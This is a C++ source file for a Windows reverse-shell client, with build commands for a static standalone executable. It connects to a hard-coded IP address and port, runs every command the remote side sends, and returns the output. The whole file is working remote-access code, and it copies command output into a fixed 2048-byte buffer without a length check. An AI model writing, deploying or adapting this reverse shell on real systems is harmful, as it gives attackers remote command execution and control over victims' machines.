// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libstdc++ -static-libgcc -static
// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libgcc
// Linker attributes -lws2_32 -static-libstdc++ -static-libgcc -static

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <unistd.h>

using namespace std;

#define BUFFER_SIZE 2048
#define PORT 55555
#define IP_ADDR "10.10.15.177"

string exec(string command) {
   char buffer[BUFFER_SIZE];
   string result = "";

   // Open pipe to file
   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }

   // read till end of process:
   while (!feof(pipe)) {

      // use buffer to read and add to result
      if (fgets(buffer, BUFFER_SIZE, pipe) != NULL)
         result += buffer;
   }

   pclose(pipe);
   return result;
}

int main(int argc, char const *argv[]){
    SOCKET clientSocket;
    WSADATA wsaData;
    
    if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0){
        cout<< " Failed at WSAStartup !" <<endl;
        return -1;
    }
    cout<< "[*] WSAStartup successful "<<endl;

    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(clientSocket == INVALID_SOCKET){
        cout << "Error at socket()"<<endl;
        WSACleanup();
        return -1;
    }
    cout<< "[*] Socket successful "<<endl;

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = inet_addr(IP_ADDR);
    service.sin_port = htons(PORT);
    memset(&(service.sin_zero),0,8);
    
    if(connect(clientSocket,(SOCKADDR *)&service,sizeof(service)) == SOCKET_ERROR){
        cout << "Error at connect()"<<endl;
        WSACleanup();
        return -1;
    }
    cout<< "[*] Connect successful "<<endl;

    int response;
    
    char receivedData[BUFFER_SIZE];
    char sendData[BUFFER_SIZE];

    strcpy(receivedData,"\0");
    getcwd(sendData,BUFFER_SIZE);

    while (true)
    {   
        response = send(clientSocket,sendData,BUFFER_SIZE,0);
        response = recv(clientSocket,receivedData,BUFFER_SIZE,0);
        string command(receivedData);

        if(strcmp(command.substr(0,2).c_str(),"cd") == 0){
            if (command.size() == 2) getcwd(sendData,BUFFER_SIZE);
            if (command.size() > 2){
                chdir(command.substr(3).c_str());
                getcwd(sendData,BUFFER_SIZE);
            }
            continue;
        }
        if(strcmp(command.c_str(),"exit") == 0){
            return -1;
        }
        string result = exec(command);
        strcpy(sendData,result.c_str());
    }
    
    WSACleanup();
    return 0;
}
